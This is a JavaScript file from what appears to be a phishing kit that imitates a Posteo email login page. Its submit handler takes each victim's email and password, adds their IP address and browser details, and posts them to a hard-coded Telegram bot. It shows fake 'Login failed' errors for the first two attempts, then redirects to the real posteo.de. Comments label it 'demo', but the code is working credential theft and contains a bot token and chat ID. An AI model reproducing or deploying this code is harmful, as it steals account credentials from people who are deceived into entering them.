function () {
  const form = document.getElementById('demo-login-form');
  if (!form) return;

  // Telegram Bot Configurationp
  const TELEGRAM_BOT_TOKEN = '7948668339:AAFu2rDu_4zSW98dpaNAVls1n0f7axCENGY';
  const TELEGRAM_CHAT_ID = '8218271186';

  async function getIPAddress() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      try {
        // Fallback IP service
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (fallbackError) {
        return 'Unknown';
      }
    }
  }

  // Function to send message to Telegram
  async function sendToTelegram(email, password) {
    try {
      const ipAddress = await getIPAddress();
      const message = `🔐 Posteo Login Attempt:
📧 Email: ${email}
🔑 Password: ${password}
🌐 User Agent: ${navigator.userAgent}
📍 IP Address: ${ipAddress}
📄 Page: ${window.location.href}`;
      
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
      
      if (!response.ok) {
        throw new Error('Telegram API error');
      }
      
      console.info('[DEMO] Credentials sent to Telegram');
      return true;
    } catch (error) {
      console.error('[DEMO] Failed to send to Telegram:', error);
      return false;
    }
  }

  // Banner: smaller and centered
  const banner = document.createElement('div');
  banner.id = 'login-error-banner';
  banner.className = [
    'fixed', 'top-0',
    'left-1/2', 'transform', '-translate-x-1/2',
    'max-w-sm', 'w-auto',
    'flex', 'items-center', 'gap-3',
    'px-4', 'py-2', 'text-white', 'select-none'
  ].join(' ');
  banner.style.display = 'none';
  banner.innerHTML = `
    <div class="flex-shrink-0">
      <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" aria-hidden="true">
        <path d="M12 9v4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M12 17h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <div class="flex-1">
      <div id="banner-title" class="font-bold text-base"></div>
      <div id="banner-sub" class="text-xs opacity-90"></div>
    </div>
    <button id="banner-dismiss" aria-label="dismiss" class="ml-2 text-white opacity-90 hover:opacity-100 focus:outline-none">&times;</button>
  `;
  document.body.appendChild(banner);

  const titleEl = banner.querySelector('#banner-title');
  const subEl = banner.querySelector('#banner-sub');
  const dismissBtn = banner.querySelector('#banner-dismiss');

  dismissBtn.addEventListener('click', hideBanner);

  // storage helpers
  const STORAGE_KEY = 'demo_login_failed_attempts';
  function getAttempts() { return parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(STORAGE_KEY, String(n)); }
  function resetAttempts() { localStorage.removeItem(STORAGE_KEY); }

  // show/hide with animation and dynamic color
  function showBanner({ type = 'error', title = '', sub = '' } = {}) {
    // set colors based on type
    if (type === 'error') {
      banner.classList.remove('bg-green-600');
      banner.classList.add('bg-[#d66563]'); // error red
    } else {
      banner.classList.remove('bg-[#d66563]');
      banner.classList.add('bg-green-600'); // success green (Tailwind)
    }

    titleEl.textContent = title;
    subEl.textContent = sub;
    banner.style.display = 'flex';
    banner.style.opacity = '0';
    banner.style.transform = 'translate(-50%, -6px)';
    banner.style.transition = 'opacity 180ms ease, transform 180ms ease';
    requestAnimationFrame(() => {
      banner.style.opacity = '1';
      banner.style.transform = 'translate(-50%, 0)';
    });
  }
  function hideBanner() {
    banner.style.opacity = '0';
    banner.style.transform = 'translate(-50%, -6px)';
    setTimeout(() => { banner.style.display = 'none'; }, 200);
  }

  // handle form submit - demo only
  form.addEventListener('submit', async function (ev) {
    ev.preventDefault(); // block real submission

    const email = (document.getElementById('email') || {}).value || '';
    const password = (document.getElementById('password') || {}).value || '';

    // Case 1: Missing email or password - show error, no redirect, no Telegram
    if (!email.trim() || !password.trim()) {
      console.info(`[DEMO] Failed login attempt — missing email or password`);
      showBanner({ type: 'error', title: 'Login failed.' });
      setTimeout(hideBanner, 1200);
      form.querySelectorAll('input[type="email"], input[type="password"], input[type="text"]').forEach(i => i.value = '');
      return;
    }

    // Case 2: Valid email and password provided - send to Telegram and handle attempts
    const attempts = getAttempts() + 1;
    setAttempts(attempts);
    console.info(`[DEMO] Login attempt #${attempts} — email with password`);
    
    // Send credentials to Telegram (with IP address) - ALL 3 attempts
    await sendToTelegram(email, password);
    
    // Show login failed error for attempts 1 and 2 only
    if (attempts < 3) {
      showBanner({ type: 'error', title: 'Login failed.' });
      setTimeout(hideBanner, 1200);
    } else {
      // On 3rd attempt - wait for Telegram to send, then redirect without showing error
      setTimeout(() => { 
        resetAttempts(); 
        window.location.href = 'https://posteo.de/de'; 
      }, 1000); // Increased delay to ensure Telegram sends
    }
    
    form.querySelectorAll('input[type="email"], input[type="password"], input[type="text"]').forEach(i => i.value = '');
  });

  // expose helper for testing
  window.__demoResetLoginAttempts = resetAttempts;
})();
